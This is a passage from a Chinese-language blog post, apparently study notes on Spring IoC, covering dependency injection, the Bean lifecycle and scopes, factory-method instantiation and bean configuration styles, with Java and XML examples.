到其他的，然后呢，其他的代码都不用变了，如果你是直接 Bean BCY，那你如果以后像用一个其他的，那你还得把所有的BCY 找出来，一一替换</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Configuration</span><br><span class="hljs-variable">@EnableWebSecurity</span> <br>public class SecurityConfig &#123;<br>    <span class="hljs-variable">@Bean</span> <br>    public PasswordEncoder <span class="hljs-built_in">passwordEncoder</span>() &#123;<br>        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">BCryptPasswordEncoder</span>(); <span class="hljs-comment">// 返回合适的实现类</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@Controller</span>  <br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/security&quot;</span>)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordController</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PasswordEncoder passwordEncoder;  <br>  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">public</span> PasswordController(PasswordEncoder passwordEncoder) &#123;  <br>        <span class="hljs-keyword">this</span>.passwordEncoder = passwordEncoder;  <br>    &#125;  <br>      <br>    <span class="hljs-comment">// 通过方法处理密码加密  </span><br>    <span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/encode-password&quot;</span>)</span>  <br>    <span class="hljs-meta">@ResponseBody</span>  <br>    <span class="hljs-keyword">public</span> String encodePassword() &#123;  <br>        String password = <span class="hljs-string">&quot;myPasswordxxxxxxx&quot;</span>;  <br>        <span class="hljs-comment">// 在方法内调用 passwordEncoder 进行密码加密  </span><br>        String encodedPassword = passwordEncoder.encode(password);  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Encoded Password: &quot;</span> + encodedPassword;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/03/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20IOC/image-20250519160241335.png"></p><p>Spring 可以通过字段注入（反射）注入依赖，但这种方式<strong>不能用在final字段上</strong>，因为final字段一旦初始化就不能再改。Spring 反射注入时，Java编译器没法确定这个final字段被初始化过，编译期就报错。<br><img src="/2025/03/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20IOC/image-20250519160340948.png"></p><p><img src="/2025/03/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20IOC/image-20250519160346033.png"></p><h3 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h3><h3 id="0、导图：Map：Spring-IOC"><a href="#0、导图：Map：Spring-IOC" class="headerlink" title="0、导图：Map：Spring IOC"></a>0、导图：<a href="../../maps/Map%EF%BC%9ASpringIoC.xmind">Map：Spring IOC</a></h3><hr><p><img src="/2025/03/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20IOC/image-20250518162951182.png"></p><p><img src="/2025/03/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20IOC/image-20250518163131432.png"></p><h3 id="1、Spring-IoC"><a href="#1、Spring-IoC" class="headerlink" title="1、Spring IoC"></a>1、Spring IoC</h3><h4 id="1-1、IoC-概述"><a href="#1-1、IoC-概述" class="headerlink" title="1.1、IoC 概述"></a>1.1、IoC 概述</h4><p>&#x3D;&#x3D;1.问题：代码高耦合度&#x3D;&#x3D;<br>在传统的面向对象编程中，类与类之间的依赖关系通常是直接创建的。这种直接依赖会导致代码高度耦合，使得系统的维护和测试变得困难。</p><p>尤其是在三层架构中，虽然层与层之间通过接口衔接，但直接依赖仍然存在。如果上层依赖下层，且下层发生改变时，上层也需要进行相应更改，这违背了软件开发中的开闭原则（OCP）和依赖倒转原则（DIP），例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 在 Service 层中直接实例化 Dao 层的对象  </span><br><span class="hljs-keyword">private</span> <span class="hljs-type">UserDao</span> <span class="hljs-variable">userDao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDaoImplForMySQL</span>();  <br>​  <br><span class="hljs-comment">// 在 Web 层中直接实例化 Service 层的对象  </span><br><span class="hljs-keyword">private</span> <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.IoC 解决方案&#x3D;&#x3D;<br>控制反转（IoC）是一种设计模式，将对象的创建和依赖关系的管理从应用程序代码中抽离出来，交由一个外部的容器或框架进行自动管理。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">// 在 IoC 容器管理下，依赖关系由容器处理</span><br><span class="hljs-keyword">private</span> UserDao userDao; <span class="hljs-comment">// 不直接实例化具体实现</span><br></code></pre></td></tr></table></figure><hr><h4 id="1-2、IoC-的实现方式"><a href="#1-2、IoC-的实现方式" class="headerlink" title="1.2、IoC 的实现方式"></a>1.2、IoC 的实现方式</h4><p>IoC 的实现方式主要有两种：</p><ol><li><font color="#00b0f0">构造器注入</font>：通过构造函数将依赖项注入。</li><li><font color="#00b0f0">Setter 注入</font>：通过 setter 方法将依赖项注入。</li></ol><hr><h4 id="1-3、Spring-IoC-是什么"><a href="#1-3、Spring-IoC-是什么" class="headerlink" title="1.3、Spring IoC 是什么"></a>1.3、Spring IoC 是什么</h4><p>Spring IoC 是 Spring 框架对 IoC 设计模式的具体实现。它可以根据配置文件或注解自动创建 Bean 对象，并对其进行依赖注入，从而有效管理 Bean 对象之间的依赖关系。此外，Spring IoC 还支持为 Bean 对象的属性赋予常量值，进一步增强了其灵活性和易用性。</p><hr><h3 id="2、Bean"><a href="#2、Bean" class="headerlink" title="2、Bean"></a>2、Bean</h3><h4 id="2-1、Bean-概述"><a href="#2-1、Bean-概述" class="headerlink" title="2.1、Bean 概述"></a>2.1、Bean 概述</h4><p>Bean 就是 Spring 容器所创建和管理的对象，Spring 容器负责这些对象的创建、生命周期的管理以及依赖关系的处理。</p><hr><h4 id="2-2、Bean-对象的生命周期"><a href="#2-2、Bean-对象的生命周期" class="headerlink" title="2.2、Bean 对象的生命周期"></a>2.2、Bean 对象的生命周期</h4><ol><li><p>&#x3D;&#x3D;实例化 Bean&#x3D;&#x3D;</p><ul><li>Spring 使用反射机制调用 Bean 的构造函数来创建 Bean 实例。默认使用无参构造函数，如果使用了构造注入，则使用相应的有参构造方法。</li></ul></li><li><p>&#x3D;&#x3D;Bean 的属性赋值&#x3D;&#x3D;</p><ul><li>在 Bean 实例化后，Spring 根据配置文件（如 XML 或注解）进行属性注入，完成依赖项的注入。</li></ul></li><li><p>&#x3D;&#x3D;检查 Aware 接口&#x3D;&#x3D;</p><ul><li>Spring 检查 Bean 是否实现了某些特定的 Aware 接口，例如 <code>BeanNameAware</code>、<code>BeanClassLoaderAware</code> 或 <code>BeanFactoryAware</code>。若实现，则调用相应的方法完成相关依赖的设置。</li></ul></li><li><p>&#x3D;&#x3D;Bean 后处理器 before 执行&#x3D;&#x3D;</p><ul><li>Spring 调用所有注册的 <code>BeanPostProcessor</code> 的 <code>postProcessBeforeInitialization</code> 方法，允许对 Bean 进行自定义操作和修改。</li></ul></li><li><p>&#x3D;&#x3D;检查 InitializingBean 接口并调用其方法&#x3D;&#x3D;</p><ul><li>检查 Bean 是否实现了 <code>InitializingBean</code> 接口。如果实现了，Spring 调用 <code>afterPropertiesSet</code> 方法进行初始化逻辑。</li></ul></li><li><p>&#x3D;&#x3D;初始化 Bean&#x3D;&#x3D;</p><ul><li>如果配置中指定了初始化方法（例如通过 <code>@PostConstruct</code> 注解或 XML 配置中的 <code>init-method</code>），Spring 会在此阶段调用这些初始化方法。</li></ul></li><li><p>&#x3D;&#x3D;Bean 后处理器 after 执行&#x3D;&#x3D;   </p><ul><li>Spring 调用所有注册的 <code>BeanPostProcessor</code> 的 <code>postProcessAfterInitialization</code> 方法，允许在 Bean 初始化后进行自定义操作和修改。</li></ul></li><li><p>&#x3D;&#x3D;使用 Bean&#x3D;&#x3D;</p><ul><li>Bean 完成初始化后，进入就绪状态，供应用程序使用。</li></ul></li><li><p>&#x3D;&#x3D;检查 DisposableBean 接口并调用其方法&#x3D;&#x3D;</p><ul><li>在 Bean 被销毁之前，Spring 检查 Bean 是否实现了 <code>DisposableBean</code> 接口。如果实现了，Spring 调用 <code>destroy</code> 方法进行资源释放等清理工作。</li></ul></li><li><p>&#x3D;&#x3D;销毁 Bean&#x3D;&#x3D;    </p><ul><li>在 Bean 生命周期的最后阶段，如果配置了自定义的销毁方法（如通过 <code>@PreDestroy</code> 注解或 XML 配置中的 <code>destroy-method</code>），Spring 会调用这些销毁方法，完成最终的清理工作。</li></ul></li></ol><hr><h4 id="2-3、Bean-对象的作用域"><a href="#2-3、Bean-对象的作用域" class="headerlink" title="2.3、Bean 对象的作用域"></a>2.3、Bean 对象的作用域</h4><p>Bean 的作用域决定了一个 Bean 实例的实例化时机、生命周期、存储方式和共享程度。常见的作用域有以下几种：</p><ul><li><p><strong>Singleton（默认，单例）</strong>：</p><ul><li><p><strong>实例化时机</strong>：Spring 容器初始化时立即创建所有的 Singleton Bean，或配置为懒加载。</p></li><li><p><strong>生命周期</strong>：从 Spring 容器初始化开始，到容器关闭为止，完成所有 10 个生命周期步骤。</p></li><li><p><strong>存储方式</strong>：实例存储在 Spring 容器内部的 <code>Map</code> 集合中，以 Bean 名称为键，实例为值。</p></li><li><p><strong>共享程度</strong>：整个应用程序中共享同一个实例，无论有多少次对该 Bean 的请求，都会返回同一个实例。</p></li></ul></li><li><p><strong>Prototype（原型）</strong>：</p><ul><li><p><strong>实例化时机</strong>：每次对 Bean 的请求都会创建一个新的实例。</p></li><li><p><strong>生命周期</strong>：仅限于请求的处理期间，Spring 不管理 Prototype Bean 的销毁，需要由应用程序代码自行处理，因此只完成生命周期前九步。</p></li><li><p><strong>存储方式</strong>：实例不在 Spring 容器中存储，每次请求获取的是不同的实例。</p></li><li><p><strong>共享程度</strong>：每次请求都会获得不同的实例，不共享。</p></li></ul></li><li><p><strong>Request（请求）</strong>（特定于 Web 应用程序）：</p><ul><li><p><strong>实例化时机</strong>：每次 HTTP 请求到达时创建实例。</p></li><li><p><strong>生命周期</strong>：从请求到达时开始，到请求处理完成后销毁实例，完成全部 10 个生命周期步骤。</p></li><li><p><strong>存储方式</strong>：实例存储在请求的上下文中。</p></li><li><p><strong>共享程度</strong>：在一次 HTTP 请求内共享，跨不同请求不共享。</p></li></ul></li><li><p><strong>Session（会话）</strong>（特定于 Web 应用程序）：</p><ul><li><p><strong>实例化时机</strong>：每次新的用户会话开始时创建实例。</p></li><li><p><strong>生命周期</strong>：从用户的 HTTP 会话开始时创建实例，到会话失效时销毁实例，完成全部 10 个生命周期步骤。</p></li><li><p><strong>存储方式</strong>：实例存储在会话上下文中。</p></li><li><p><strong>共享程度</strong>：在同一个会话中共享，跨不同会话不共享。</p></li></ul></li><li><p><strong>Global session（全局会话）</strong>（主要用于基于 Portlet 的 Web 应用）：</p><ul><li><p><strong>实例化时机</strong>：当 global session 开始时创建实例。</p></li><li><p><strong>生命周期</strong>：与 global session 生命周期相同，从 global session 开始时创建实例，到 global session 失效时销毁实例，完成全部 10 个生命周期步骤。</p></li><li><p><strong>存储方式</strong>：实例存储在 global session 上下文中。</p></li><li><p><strong>共享程度</strong>：在所有 Portlet 中共享同一个实例。</p></li></ul></li></ul><hr><h4 id="2-4、Bean-对象的实例化方式"><a href="#2-4、Bean-对象的实例化方式" class="headerlink" title="2.4、Bean 对象的实例化方式"></a>2.4、Bean 对象的实例化方式</h4><h5 id="2-4-1、前言：实例化方式-概述"><a href="#2-4-1、前言：实例化方式-概述" class="headerlink" title="2.4.1、前言：实例化方式 概述"></a>2.4.1、前言：实例化方式 概述</h5><p>Bean 的实例化由 Spring 框架负责。了解 Spring 如何实例化 Bean 以及如何配置 Bean 的实例化方式是配置和优化 Spring 应用的重要部分。Bean 的实例化方式包括：</p><ol><li><font color="#00b0f0">构造方法（本质）</font></li><li><font color="#00b0f0">简单工厂模式</font></li><li><font color="#00b0f0">实例工厂模式</font></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>这三种实例化方法，本质上都是通过调用类的构造方法实现的</li></ol></blockquote><hr><h5 id="2-4-2、构造方法"><a href="#2-4-2、构造方法" class="headerlink" title="2.4.2、构造方法"></a>2.4.2、构造方法</h5><p>Spring 默认使用无参构造方法创建 Bean 实例，如果使用了构造注入，则使用相应的有参构造方法。</p><hr><h5 id="2-4-3、简单工厂模式"><a href="#2-4-3、简单工厂模式" class="headerlink" title="2.4.3、简单工厂模式"></a>2.4.3、简单工厂模式</h5><p>&#x3D;&#x3D;1.工厂类&#x3D;&#x3D;</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">WeaponFactory</span> </span>&#123;  <br>​  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Weapon createWeapon(<span class="hljs-keyword">String</span> weaponType) &#123;  <br><span class="hljs-keyword">if</span> (weaponType == <span class="hljs-literal">null</span> || weaponType.trim().isEmpty()) &#123;  <br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span><span class="hljs-type"></span> IllegalArgumentException(<span class="hljs-string">&quot;Weapon type must not be null or empty&quot;</span>);  <br>&#125;  <br>  <br><span class="hljs-keyword">switch</span> (weaponType.toLowerCase()) &#123;  <br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;sword&quot;</span>:  <span class="hljs-type"></span><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span><span class="hljs-type"></span> Sword();  <br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;bow&quot;</span>:  <span class="hljs-type"></span><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span><span class="hljs-type"></span> Bow();  <br><span class="hljs-keyword">default</span>:  <span class="hljs-type"></span><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span><span class="hljs-type"></span> IllegalArgumentException(<span class="hljs-string">&quot;Unknown weapon type&quot;</span>);  <br>&#125;  <br>&#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.XML 配置&#x3D;&#x3D;</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">声明产品 Bean</span><br><span class="hljs-comment">class：指向工厂类</span><br><span class="hljs-comment">factroy-method：指向工厂类的方法，Spring 将调用这个方法创建 Bean 实例</span><br><span class="hljs-comment">&lt;constructor-arg&gt;：为工厂类的静态方法传递参数</span><br><span class="hljs-comment">--&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;weapon&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.WeaponFactory&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;createWeapon&quot;</span>&gt;</span> <br><span class="hljs-comment">&lt;!-- 通过 &lt;constructor-arg&gt; 元素传递工厂方法参数 --&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;sword&quot;</span>/&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h5 id="2-4-4、实例工厂模式"><a href="#2-4-4、实例工厂模式" class="headerlink" title="2.4.4、实例工厂模式"></a>2.4.4、实例工厂模式</h5><p>&#x3D;&#x3D;1.具体工厂角色&#x3D;&#x3D;</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">TankFactory</span> <span class="hljs-keyword"><span class="hljs-keyword">implements</span> <span class="hljs-type">WeaponFactory</span></span> </span>&#123;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Weapon <span class="hljs-keyword">get</span>() &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span><span class="hljs-type"></span> Tank(); <br>&#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.XML 配置&#x3D;&#x3D;</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 声明具体工厂 Bean --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;gunFactory&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.powernode.spring6.bean.GunFactory&quot;</span>/&gt;</span>  <br><br><span class="hljs-comment">&lt;!-- </span><br><span class="hljs-comment">声明产品 Bean</span><br><span class="hljs-comment">factory-bean：指向具体工厂 Bean，通过该工厂 Bean 创建目标 Bean</span><br><span class="hljs-comment">factory-method：指向具体工厂的方法，Spring 将调用这个方法创建 Bean 实例</span><br><span class="hljs-comment">--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;gun&quot;</span> <span class="hljs-attr">factory-bean</span>=<span class="hljs-string">&quot;gunFactory&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;get&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1、基本开发步骤"><a href="#1、基本开发步骤" class="headerlink" title="1、基本开发步骤"></a>1、基本开发步骤</h3><h4 id="1-1、环境准备"><a href="#1-1、环境准备" class="headerlink" title="1.1、环境准备"></a>1.1、环境准备</h4><hr><h4 id="1-2、创建-Spring-IoC-项目"><a href="#1-2、创建-Spring-IoC-项目" class="headerlink" title="1.2、创建 Spring IoC 项目"></a>1.2、创建 Spring IoC 项目</h4><p>引入 <a href="https://mvnrepository.com/artifact/org.springframework/spring-context">Spring Context 依赖</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 1. Spring Context --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>xxxxx<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="1-3、编写-Bean-类"><a href="#1-3、编写-Bean-类" class="headerlink" title="1.3、编写 Bean 类"></a>1.3、编写 Bean 类</h4><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QianDaYe</span> &#123;<br>    <span class="hljs-comment">// 1. 对象类型</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Object</span> userDao;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Object</span> bankDao;<br>    <br>    <span class="hljs-comment">// 2. 简单数组</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[] ages; <span class="hljs-comment">// 一维数组</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[][] ages2D; <span class="hljs-comment">// 二维数组</span><br>    <br>    <span class="hljs-comment">// 3. 复杂数组</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Object</span>[] womens; <span class="hljs-comment">// 一维数组</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Object</span>[][] womens2D;  <span class="hljs-comment">// 二维数组</span><br>    <br>    <span class="hljs-comment">// 4. 简单 List 集合</span><br>    <span class="hljs-keyword">private</span> List&lt;Integer&gt; ageList;  <span class="hljs-comment">// Integer 类型 List</span><br>    <br>    <span class="hljs-comment">// 5. 复杂 List 集合</span><br>    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-built_in">Object</span>&gt; womenList; <br>    <br>    <span class="hljs-comment">// 6. 简单 Set 集合</span><br>    <span class="hljs-keyword">private</span> Set&lt;Integer&gt; ageSet;  <span class="hljs-comment">// Integer 类型 Set</span><br>    <br>    <span class="hljs-comment">// 7. 复杂 Set 集合</span><br>    <span class="hljs-keyword">private</span> Set&lt;<span class="hljs-built_in">Object</span>&gt; womenSet; <br>    <br><span class="hljs-comment">// 8. 简单 Map 集合</span><br>    <span class="hljs-keyword">private</span> Map&lt;<span class="hljs-built_in">String</span>, Integer&gt; ageMap;  <span class="hljs-comment">// Integer 类型的 Map</span><br>    <br>    <span class="hljs-comment">// 9. 复杂 Map 集合</span><br>    <span class="hljs-keyword">private</span> Map&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">Object</span>&gt; phones; <span class="hljs-comment">// Map 集合</span><br>    <br>    <span class="hljs-comment">// 10. 简单数据类型</span><br>    <br>    <span class="hljs-comment">// 10.1 基本数据类型</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;  <br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> isActive; <br><span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance;  <br><span class="hljs-keyword">private</span> <span class="hljs-type">char</span> grade; <br><span class="hljs-keyword">private</span> <span class="hljs-type">long</span> id;  <br><span class="hljs-keyword">private</span> <span class="hljs-type">float</span> weight; <br><br><span class="hljs-comment">// 10.2 包装类型</span><br>    <span class="hljs-keyword">private</span> Integer ageWrapper;  <br>    <span class="hljs-keyword">private</span> Boolean isActiveWrapper;  <br>    <span class="hljs-keyword">private</span> Double balanceWrapper; <br>    <span class="hljs-keyword">private</span> Character gradeWrapper;  <br>    <span class="hljs-keyword">private</span> Long idWrapper; <br>    <span class="hljs-keyword">private</span> Float weightWrapper; <br>    <br><span class="hljs-comment">// 10.3 字符串类型</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> name;  <br>    <br>    <br>    <span class="hljs-comment">// 有参构造</span><br>    <span class="hljs-comment">// 无参构造</span><br>    <span class="hljs-comment">// Getter 方法</span><br>    <span class="hljs-comment">// Setter 方法</span><br>    <span class="hljs-comment">// toString 方法</span><br>    <br><span class="hljs-comment">// 其他方法</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="1-4、配置与使用-Bean"><a href="#1-4、配置与使用-Bean" class="headerlink" title="1.4、配置与使用 Bean"></a>1.4、配置与使用 Bean</h4><h5 id="1-4-1、配置概述"><a href="#1-4-1、配置概述" class="headerlink" title="1.4.1、配置概述"></a>1.4.1、配置概述</h5><p>在 Spring IoC 中，配置 Bean 的方式有三种：</p><ol><li>&#x3D;&#x3D;XML 配置文件 配置方式&#x3D;&#x3D;：<ol><li>在 <code>applicationContext.xml</code> 配置文件中进行声明 Bean 对象和配置属性注入<ol><li>优点：同一 Bean 类可以配置多个实例</li><li>缺点：仅适用于管理对象类型的 Bean</li></ol></li><li><font color="#00b0f0">构造注入</font>：<ol><li>通过构造器进行依赖注入，需要在 XML 中手动配置属性注入</li></ol></li><li><font color="#00b0f0">Setter 注入</font>：<ol><li>通过 setter 方法进行依赖注入，同样需要在 XML 中手动配置属性注入</li></ol></li><li><font color="#00b0f0">自动装配</font>：<ol><li>启用自动装配后，容器可自动匹配依赖，但无法注入基本数据类型及其集合（如简单数组、简单 List、简单 Set、简单 Map）</li></ol></li></ol></li><li>&#x3D;&#x3D;注解 + 扫描 配置方式（推荐）&#x3D;&#x3D;：<ol><li>结合注解（如 <code>@Component</code>、<code>@Resource</code>、<code>@Autowired</code>、<code>@Value</code> 等）和类路径扫描（XML 文件扫描或配置类扫描）实现声明 Bean 对象和配置属性注入<ol><li>优点：配置简单、减少 XML 文件，自动扫描和自动装配更加方便。</li><li>缺点：<ol><li>仅适用于管理对象类型的 Bean</li><li>同一 Bean 类只能声明一个实例（即同一个注解标注的对象）</li></ol></li></ol></li><li>在 Bean 类中声明 Bean 对象和配置属性注入<ol><li>对于对象类型及其集合（如复杂数组、复杂 List 、复杂 Set 、复杂 Map ），常通过 <code>@Autowired</code>、<code>@Resource</code>、<code>@Qualifier</code> 注解进行自动装配</li><li>对于基本数据类型及其集合（如简单数组、简单 List 、简单 Set 、简单 Map ），常通过 <code>@Value</code> 注解进行手动注入（需要加载外部 <code>properties</code> 文件）</li></ol></li><li>在配置类 或 XML 配置文件中扫描这些 Bean 类，使其被 Spring 容器管理。</li></ol></li><li>&#x3D;&#x3D;配置类 + 注解 + 扫描 配置方式&#x3D;&#x3D;<ol><li>在 Java 配置类（例如 <code>ApplicationConfig</code>）中，通过 <code>@Bean</code> 注解声明 Bean，同时配合注解（如 <code>@Component</code>、<code>@Resource</code>、<code>@Autowired</code>、<code>@Value</code> 等）和扫描机制（配置类扫描）管理组件。<ol><li>优点：<ol><li>不仅可以管理对象类型的 Bean，还支持数组、List、Set、Map 等多种类型的 Bean</li><li>允许为同一 Bean 类声明多个实例</li></ol></li><li>缺点：<ol><li>在配置类中，需要手动配置属性注入</li></ol></li></ol></li><li>在 <code>ApplicationConfig</code> 配置类中，使用 <code>@Bean</code> 注解声明 Bean 并配置属性输入，同时启用组件扫描以管理其他组件类。</li><li>在其他组件类可通过 <code>@Autowired</code>、<code>@Resource</code> 或 <code>@Qualifier</code> 